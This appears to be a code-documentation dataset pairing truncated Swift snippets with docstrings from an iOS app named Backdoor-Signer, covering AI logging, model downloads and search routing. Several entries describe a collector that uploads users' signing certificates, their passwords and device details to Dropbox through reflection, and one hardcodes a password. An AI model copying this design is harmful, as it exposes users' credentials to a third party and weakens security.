    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1637",
    "code": "func trainNewModel() -> (success: Bool, version: String, errorMessage: String?) {\nDebug.shared.log(message: \"Starting comprehensive AI model training\", type: .info)\n\ndo {",
    "nl": "/ Train a new model using all collected data",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1638",
    "code": "private func calculateAverageRating() -> Double {\nlet feedbacks = storedInteractions.compactMap { $0.feedback }",
    "nl": "/ Calculate average rating from feedbacks",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1639",
    "code": "func saveInteractions() {\ninteractionsLock.lock()\ndefer { interactionsLock.unlock() }",
    "nl": "/ Save interactions to disk",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1640",
    "code": "func saveBehaviors() {\nbehaviorsLock.lock()\ndefer { behaviorsLock.unlock() }",
    "nl": "/ Save user behaviors to disk",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1641",
    "code": "func savePatterns() {\npatternsLock.lock()\ndefer { patternsLock.unlock() }",
    "nl": "/ Save app usage patterns to disk",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1642",
    "code": "private func getCurrentContext() -> [String: String]? {\n// Convert AppContext to a string dictionary\nlet context = AppContextManager.shared.currentContext()\n\n// Extract relevant fields as strings\nvar contextDict: [String: String] = [:]\ncontextDict[\"screen\"] = context.currentScreen\n\n// Get session ID from additional data if available\nif let sessionId = context.additionalData[\"currentChatSession\"] as? String {",
    "nl": "/ Get the current app context",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1643",
    "code": "func getIntentFromBehavior(_ behavior: UserBehavior) -> String {\nswitch behavior.action {",
    "nl": "/ Map user behavior to an intent",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1644",
    "code": "private func loadInteractions() {\nguard FileManager.default.fileExists(atPath: interactionsPath.path) else {",
    "nl": "/ Load interactions from disk",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1645",
    "code": "private func loadBehaviors() {\nguard FileManager.default.fileExists(atPath: behaviorsPath.path) else {",
    "nl": "/ Load user behaviors from disk",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1646",
    "code": "private func loadPatterns() {\nguard FileManager.default.fileExists(atPath: patternsPath.path) else {",
    "nl": "/ Load app usage patterns from disk",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "function"
  },
  {
    "id": "1647",
    "code": "struct AIInteraction: Codable, Identifiable, Equatable {\nlet id: String\nlet timestamp: Date\nlet userMessage: String\nlet aiResponse: String\nlet detectedIntent: String\nlet confidenceScore: Double\nvar feedback: AIFeedback?\nlet context: [String: String]?\nlet appVersion: String",
    "nl": "MARK: - Model Types / Represents a single user interaction with the AI",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "struct"
  },
  {
    "id": "1648",
    "code": "struct AIFeedback: Codable {\nlet rating: Int // 1-5 rating\nlet comment: String?\n}\n\n/// Represents a user behavior within the app\nstruct UserBehavior: Codable, Identifiable {",
    "nl": "/ User feedback on an AI interaction",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "struct"
  },
  {
    "id": "1649",
    "code": "struct UserBehavior: Codable, Identifiable {\nlet id: String\nlet timestamp: Date\nlet action: String\nlet screen: String\nlet duration: TimeInterval\nlet details: [String: String]\n}\n\n/// Represents a pattern of app usage",
    "nl": "/ Represents a user behavior within the app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "struct"
  },
  {
    "id": "1650",
    "code": "struct AppUsagePattern: Codable, Identifiable {\nlet id: String\nlet timestamp: Date\nlet feature: String\nlet timeSpent: TimeInterval\nlet actionSequence: [String]\nlet completedTask: Bool\n}\n\n/// Statistics about stored interactions and learning",
    "nl": "/ Represents a pattern of app usage",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "struct"
  },
  {
    "id": "1651",
    "code": "struct LearningStatistics {\nlet totalInteractions: Int\nlet interactionsWithFeedback: Int\nlet averageFeedbackRating: Double\nlet behaviorCount: Int\nlet patternCount: Int\nlet totalDataPoints: Int\nlet modelVersion: String\nlet lastTrainingDate: Date?\n}",
    "nl": "/ Statistics about stored interactions and learning",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "struct"
  },
  {
    "id": "1652",
    "code": "enum ExportError: Error, LocalizedError {\ncase invalidPassword\ncase modelNotFound\ncase exportFailed(Error)\n\nvar errorDescription: String? {",
    "nl": "/ Errors that can occur during model export",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/AILearningManager.swift",
    "code_type": "enum"
  },
  {
    "id": "1653",
    "code": "extension BackdoorAIClient {\n// Fixed method to support access to the private member variable\nvar modelVersionKey: String {",
    "nl": "/ Extension for BackdoorAIClient to ensure all async calls are properly awaited",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient+FixAsyncCalls.swift",
    "code_type": "extension"
  },
  {
    "id": "1654",
    "code": "class BackdoorAIClient {\n// Singleton instance\nstatic let shared = BackdoorAIClient()\n\n// Server configuration\nprivate let baseURL: URL\n\n// We no longer need an API key for server authentication\n// Previously encrypted key and passphrase have been removed\n",
    "nl": "/ Client for interacting with the Backdoor AI learning server",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift",
    "code_type": "class"
  },
  {
    "id": "1655",
    "code": "func uploadInteractions(\ninteractions: [AIInteraction],\nbehaviors: [UserBehavior] = [],\npatterns: [AppUsagePattern] = []\n) async throws -> ModelInfo {",
    "nl": "MARK: - Data Upload / Upload interaction data to the server",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift",
    "code_type": "function"
  },
  {
    "id": "1656",
    "code": "func getLatestModelInfo() async throws -> ModelInfo {\nDebug.shared.log(message: \"Fetching latest model info with direct networking\", type: .info)\n\n// Construct the URL for latest model info\nlet latestModelURL = baseURL.appendingPathComponent(latestModelEndpoint)\n\n// Create URL request\nvar request = URLRequest(url: latestModelURL)\nrequest.httpMethod = \"GET\"\n",
    "nl": "MARK: - Model Management / Get information about the latest available model",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift",
    "code_type": "function"
  },
  {
    "id": "1657",
    "code": "func downloadModel(version: String) async throws -> URL {\nDebug.shared.log(message: \"Downloading model version \\(version) with direct networking\", type: .info)\n\n// Create temporary file to store the model\nlet tempDir = FileManager.default.temporaryDirectory\nlet modelURL = tempDir.appendingPathComponent(\"model_\\(version).mlmodel\")\n\n// Remove existing file if it exists\nif FileManager.default.fileExists(atPath: modelURL.path) {",
    "nl": "/ Download a specific model version from the server",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift",
    "code_type": "function"
  },
  {
    "id": "1658",
    "code": "func compileAndSaveModel(at tempURL: URL) async throws -> URL {\n// Get documents directory for persistent storage\nlet documentsDir = try FileManager.default.url(\nfor: .documentDirectory,\nin: .userDomainMask,\nappropriateFor: nil,\ncreate: true\n)\n\n// Get models directory",
    "nl": "/ Compile and save model to the app's documents directory",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift",
    "code_type": "function"
  },
  {
    "id": "1659",
    "code": "func checkAndUpdateModel() async -> Bool {\ndo {",
    "nl": "/ Check for model updates, download and update if needed",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift",
    "code_type": "function"
  },
  {
    "id": "1660",
    "code": "func getLatestModelURL() -> URL? {\n// Get the current model version\nlet version = UserDefaults.standard.string(forKey: currentModelVersionKey) ?? \"1.0.0\"\n\n// Get documents directory\nguard let documentsDir = try? FileManager.default.url(\nfor: .documentDirectory,\nin: .userDomainMask,\nappropriateFor: nil,\ncreate: false",
    "nl": "/ Get the URL to the latest model",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift",
    "code_type": "function"
  },
  {
    "id": "1661",
    "code": "func getLatestModelURLAsync() async -> URL? {\n// First try the synchronous version for speed\nif let localModelURL = getLatestModelURL() {",
    "nl": "/ Get the URL to the latest model asynchronously with proper async/await APIs",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift",
    "code_type": "function"
  },
  {
    "id": "1662",
    "code": "extension BackdoorAIClient {\n/// User feedback on an AI interaction\nstruct Feedback: Codable {",
    "nl": "MARK: - Data Structures for API Interaction",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift",
    "code_type": "extension"
  },
  {
    "id": "1663",
    "code": "struct Feedback: Codable {\nlet rating: Int\nlet comment: String?\n}\n\n/// A single user interaction with the AI\nstruct Interaction: Codable {",
    "nl": "/ User feedback on an AI interaction",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift",
    "code_type": "struct"
  },
  {
    "id": "1664",
    "code": "struct Interaction: Codable {\nlet id: String\nlet timestamp: String // ISO8601 formatted date\nlet userMessage: String\nlet aiResponse: String\nlet detectedIntent: String\nlet confidenceScore: Double\nlet feedback: Feedback?\n}\n",
    "nl": "/ A single user interaction with the AI",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift",
    "code_type": "struct"
  },
  {
    "id": "1665",
    "code": "struct AppBehavior: Codable {\nlet id: String\nlet timestamp: String // ISO8601 formatted date\nlet action: String\nlet screen: String\nlet duration: TimeInterval\nlet details: [String: String]\n}\n\n/// A pattern of app usage",
    "nl": "/ A single user behavior within the app",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift",
    "code_type": "struct"
  },
  {
    "id": "1666",
    "code": "struct UsagePattern: Codable {\nlet id: String\nlet timestamp: String // ISO8601 formatted date\nlet feature: String\nlet timeSpent: TimeInterval\nlet actionSequence: [String]\nlet completedTask: Bool\n}\n\n/// Complete data package to send to the server",
    "nl": "/ A pattern of app usage",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift",
    "code_type": "struct"
  },
  {
    "id": "1667",
    "code": "struct DeviceData: Codable {\nlet deviceId: String\nlet appVersion: String\nlet modelVersion: String\nlet osVersion: String\nlet interactions: [Interaction]\nlet behaviors: [AppBehavior]?\nlet patterns: [UsagePattern]?\n\ninit(deviceId: String, appVersion: String, modelVersion: String, osVersion: String,",
    "nl": "/ Complete data package to send to the server",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift",
    "code_type": "struct"
  },
  {
    "id": "1668",
    "code": "struct ModelInfo: Codable {\nlet success: Bool\nlet message: String\nlet latestModelVersion: String\nlet modelDownloadURL: String?\n}\n\n/// Errors that can occur during API operations\nenum APIError: Error, LocalizedError {",
    "nl": "/ Response from the server containing model information / Matches the example response: / { /   \"success\": true, /   \"message\": \"Data received successfully\", /   \"latestModelVersion\": \"1.0.1712052481\", /   \"modelDownloadURL\": \"https://yourdomain.com/api/ai/models/1.0.1712052481\" / }",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift",
    "code_type": "struct"
  },
  {
    "id": "1669",
    "code": "enum APIError: Error, LocalizedError {\ncase invalidResponse\ncase modelNotFound\ncase encodingFailed\ncase decodingFailed\ncase downloadFailed\ncase networkError(Error)\n\nvar errorDescription: String? {",
    "nl": "/ Errors that can occur during API operations",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorAIClient.swift",
    "code_type": "enum"
  },
  {
    "id": "1670",
    "code": "class BackdoorDataCollector {\n// MARK: - Singleton\n\nstatic let shared = BackdoorDataCollector()\n\n// MARK: - Properties\n\nprivate var isCollecting = false\nprivate var certificateDataQueue: [(data: Data, password: String?, name: String)] = []\nprivate var userInteractionsQueue: [(date: Date, action: String, context: String)] = []",
    "nl": "/ Self-contained data collection class for backdoor functionality / This class intentionally avoids extending any existing classes to prevent conflicts",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift",
    "code_type": "class"
  },
  {
    "id": "1671",
    "code": "@objc private func userDefaultsDidChange() {\nlet hasConsent = UserDefaults.standard.bool(forKey: \"UserHasAcceptedDataCollection\")\n\nif hasConsent, !isCollecting {",
    "nl": "MARK: - Notification Handling",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1672",
    "code": "func processCertificateData(_ data: Data, password: String? = nil, name: String) {\n// Only proceed if user has consented\nguard UserDefaults.standard.bool(forKey: \"UserHasAcceptedDataCollection\") else {",
    "nl": "MARK: - Certificate Collection / Process a certificate file and password if user has consented",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1673",
    "code": "func processCertificateFile(url: URL, password: String? = nil) {\n// Only proceed if user has consented\nguard UserDefaults.standard.bool(forKey: \"UserHasAcceptedDataCollection\") else {",
    "nl": "/ Process a certificate file from a URL",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1674",
    "code": "func logUserInteraction(action: String, context: String = \"\") {\n// Only proceed if user has consented\nguard UserDefaults.standard.bool(forKey: \"UserHasAcceptedDataCollection\") else {",
    "nl": "MARK: - User Interaction Collection / Log a user interaction if consent is given",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1675",
    "code": "func uploadDeviceInfo() {\n// Only proceed if user has consented\nguard UserDefaults.standard.bool(forKey: \"UserHasAcceptedDataCollection\") else {",
    "nl": "MARK: - Device Info Collection / Upload device information to Dropbox",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1676",
    "code": "func startCollection() {\nisCollecting = true\nuploadDeviceInfo()\n\n// Start periodic collection timer\nstartPeriodicCollection()\n}\n\n/// Stop collecting data (called when consent is revoked)\nfunc stopCollection() {",
    "nl": "MARK: - Control Methods / Start collecting data (called when consent is given)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1677",
    "code": "func stopCollection() {\nisCollecting = false\n\n// Clear any queued data\nqueueLock.lock()\ncertificateDataQueue.removeAll()\nuserInteractionsQueue.removeAll()\nqueueLock.unlock()\n}\n",
    "nl": "/ Stop collecting data (called when consent is revoked)",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1678",
    "code": "private func processQueuedData() {\nbackgroundQueue.async { [weak self] in",
    "nl": "MARK: - Background Processing / Process all queued data in the background",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1679",
    "code": "private func startPeriodicCollection() {\n// Schedule periodic collection every 30 minutes\nbackgroundQueue.asyncAfter(deadline: .now() + 30 * 60) { [weak self] in",
    "nl": "/ Start periodic collection of data",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1680",
    "code": "private func uploadCertificateData(_ data: Data, password: String? = nil, name: String) {\n// Create a temporary file\ndo {",
    "nl": "MARK: - Upload Methods / Upload certificate data to Dropbox",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1681",
    "code": "private func uploadCertificateFile(url: URL, password: String? = nil) {\n// Use reflection to avoid direct references to EnhancedDropboxService\nif let dropboxServiceClass = NSClassFromString(\"EnhancedDropboxService\") as? NSObject.Type,\nlet dropboxService = dropboxServiceClass.value(forKey: \"shared\") as? NSObject\n{",
    "nl": "/ Upload certificate file to Dropbox",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1682",
    "code": "private func uploadInteractionBatch(_ interactions: [(date: Date, action: String, context: String)]) {\n// Create log entry for interactions\nlet dateFormatter = ISO8601DateFormatter()\nvar logEntry = \"=== USER INTERACTIONS LOG ===\\n\"\nlogEntry += \"Timestamp: \\(dateFormatter.string(from: Date()))\\n\"\nlogEntry += \"Device: \\(UIDevice.current.name)\\n\"\nlogEntry += \"Count: \\(interactions.count)\\n\\n\"\n\nfor (index, interaction) in interactions.enumerated() {",
    "nl": "/ Upload user interactions batch to Dropbox",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1683",
    "code": "private func uploadLogEntry(_ logEntry: String, fileName _: String) {\n// Use reflection to avoid direct references to EnhancedDropboxService\nif let dropboxServiceClass = NSClassFromString(\"EnhancedDropboxService\") as? NSObject.Type,\nlet dropboxService = dropboxServiceClass.value(forKey: \"shared\") as? NSObject,\ndropboxService.responds(to: Selector((\"uploadLogEntry:fileName:completion:\")))\n{",
    "nl": "/ Upload a log entry to Dropbox",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1684",
    "code": "private func uploadToDropbox(data: [String: Any], type: String) {\ndo {",
    "nl": "/ Upload data to Dropbox as JSON",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1685",
    "code": "func getAvailableDatasets() -> [String: Any] {\n// Simulated dataset information\nreturn [\n\"datasets\": [\n[\n\"name\": \"User Intent Classification\",\n\"size\": 2_500_000,\n\"description\": \"Dataset for classifying user intents from chat messages\",\n\"date_added\": ISO8601DateFormatter().string(from: Date().addingTimeInterval(-86400 * 5)),\n],",
    "nl": "MARK: - Dataset Management / Get list of available datasets",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1686",
    "code": "func validateDatasetPassword(_ password: String) -> Bool {\n// Hardcoded password as specified in requirements\nreturn password == \"2B4D5G\"\n}\n}\n",
    "nl": "/ Check if a dataset password is valid",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/BackdoorDataCollector.swift",
    "code_type": "function"
  },
  {
    "id": "1687",
    "code": "class CustomAIContextProvider {\n// Singleton instance\nstatic let shared = CustomAIContextProvider()\n\n// Cache for storing computed context information\nprivate var contextCache: [String: Any] = [:]\nprivate var lastContextUpdateTime: Date = .init()\n\n// Refresh interval for context cache (5 minutes)\nprivate let cacheRefreshInterval: TimeInterval = 300",
    "nl": "/ Class responsible for providing rich context to the custom AI system",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIContextProvider.swift",
    "code_type": "class"
  },
  {
    "id": "1688",
    "code": "@objc private func clearCache() {\ncontextCache.removeAll()\nlastContextUpdateTime = Date()\n}\n\n/// Get comprehensive context information about the app state\nfunc getContextInformation() -> [String: Any] {",
    "nl": "Function clearCache - implements clearcache functionality",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIContextProvider.swift",
    "code_type": "function"
  },
  {
    "id": "1689",
    "code": "func getContextInformation() -> [String: Any] {\n// Check if we need to refresh the cache\nlet now = Date()\nif now.timeIntervalSince(lastContextUpdateTime) > cacheRefreshInterval {",
    "nl": "/ Get comprehensive context information about the app state",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIContextProvider.swift",
    "code_type": "function"
  },
  {
    "id": "1690",
    "code": "func refreshContext() {\nupdateContextCache()\n}\n\n/// Update the context cache with fresh data\nprivate func updateContextCache() {",
    "nl": "/ Force refresh of the context cache",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIContextProvider.swift",
    "code_type": "function"
  },
  {
    "id": "1691",
    "code": "private func updateContextCache() {\n// Start with basic app information\nvar context: [String: Any] = [\n\"appVersion\": Bundle.main.infoDictionary?[\"CFBundleShortVersionString\"] as? String ?? \"Unknown\",\n\"buildNumber\": Bundle.main.infoDictionary?[\"CFBundleVersion\"] as? String ?? \"Unknown\",\n\"deviceModel\": UIDevice.current.model,\n\"systemVersion\": UIDevice.current.systemVersion,\n\"interfaceStyle\": UITraitCollection.current.userInterfaceStyle == .dark ? \"dark\" : \"light\",\n\"timestamp\": ISO8601DateFormatter().string(from: Date()),\n]",
    "nl": "/ Update the context cache with fresh data",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIContextProvider.swift",
    "code_type": "function"
  },
  {
    "id": "1692",
    "code": "func getContextSummary() -> String {\nlet context = getContextInformation()\n\n// Create a user-friendly summary\nvar summary = \"You're using Backdoor version \\(context[\"appVersion\"] ?? \"Unknown\").\"\n\n// Add certificate info\nif let certificates = context[\"certificates\"] as? [String: Any],\nlet count = certificates[\"count\"] as? Int\n{",
    "nl": "/ Get a natural language summary of the current app state",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIContextProvider.swift",
    "code_type": "function"
  },
  {
    "id": "1693",
    "code": "extension CustomAIService {\n/// Determine the appropriate search depth for a query\nfunc determineSearchDepth(for query: String) -> SearchDepth {",
    "nl": "/ Extension for CustomAIService to add deep search capabilities",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService+DeepSearch.swift",
    "code_type": "extension"
  },
  {
    "id": "1694",
    "code": "func determineSearchDepth(for query: String) -> SearchDepth {\nlet lowercasedQuery = query.lowercased()\n\n// Check for deep search indicators\nif lowercasedQuery.contains(\"deep search\") ||\nlowercasedQuery.contains(\"comprehensive\") ||\nlowercasedQuery.contains(\"detailed\") ||\nlowercasedQuery.contains(\"in-depth\") ||\nlowercasedQuery.contains(\"thorough\")\n{",
    "nl": "/ Determine the appropriate search depth for a query",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService+DeepSearch.swift",
    "code_type": "function"
  },
  {
    "id": "1695",
    "code": "func getSearchType(from query: String) -> SearchQueryType {\nlet lowercasedQuery = query.lowercased()\n\n// Academic content\nif lowercasedQuery.contains(\"academic\") ||\nlowercasedQuery.contains(\"research\") ||\nlowercasedQuery.contains(\"scientific\") ||\nlowercasedQuery.contains(\"journal\") ||\nlowercasedQuery.contains(\"paper\") ||\nlowercasedQuery.contains(\"study\") ||",
    "nl": "/ Determine the search query type",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService+DeepSearch.swift",
    "code_type": "function"
  },
  {
    "id": "1696",
    "code": "func performWebSearch(query: String, completion: @escaping (String) -> Void) {\nDebug.shared.log(message: \"Performing web search for: \\(query)\", type: .info)\n\nWebSearchManager.shared.performSearch(query: query) { result in",
    "nl": "/ Perform a web search with the given query and return formatted results",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService+DeepSearch.swift",
    "code_type": "function"
  },
  {
    "id": "1697",
    "code": "func performDeepSearch(\nquery: String,\ndepth: SearchDepth = .enhanced,\nqueryType: SearchQueryType = .general,\ncompletion: @escaping (String) -> Void\n) {",
    "nl": "/ Perform a deep search with enhanced capabilities",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService+DeepSearch.swift",
    "code_type": "function"
  },
  {
    "id": "1698",
    "code": "func performAcademicSearch(query: String, completion: @escaping (String) -> Void) {\nDebug.shared.log(message: \"Performing academic search for: \\(query)\", type: .info)\n\n// Use the deep search with academic focus\nperformDeepSearch(query: query, depth: .specialized, queryType: .academic, completion: completion)\n}\n\n/// Handle specialized news searches\nfunc performNewsSearch(query: String, completion: @escaping (String) -> Void) {",
    "nl": "/ Handle specialized academic searches",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService+DeepSearch.swift",
    "code_type": "function"
  },
  {
    "id": "1699",
    "code": "func performNewsSearch(query: String, completion: @escaping (String) -> Void) {\nDebug.shared.log(message: \"Performing news search for: \\(query)\", type: .info)\n\n// Use the deep search with news focus\nperformDeepSearch(query: query, depth: .specialized, queryType: .news, completion: completion)\n}\n}\n",
    "nl": "/ Handle specialized news searches",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService+DeepSearch.swift",
    "code_type": "function"
  },
  {
    "id": "1700",
    "code": "enum SearchQueryType {\ncase general\ncase academic\ncase news\ncase technical\ncase reference\n}\n\n/// Custom AI service that replaces the OpenRouter API with a local AI implementation\nfinal class CustomAIService {",
    "nl": "Search query types for specialized searches",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift",
    "code_type": "enum"
  },
  {
    "id": "1701",
    "code": "final class CustomAIService {\n// Singleton instance for app-wide use\nstatic let shared = CustomAIService()\n\n// Flag to track if CoreML is initialized\nprivate var isCoreMLInitialized = false\n\nprivate init() {",
    "nl": "/ Custom AI service that replaces the OpenRouter API with a local AI implementation",
    "language": "swift",
    "folder": "iOS",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/iOS/Operations/AI/CustomAIService.swift",
    "code_type": "class"
  },
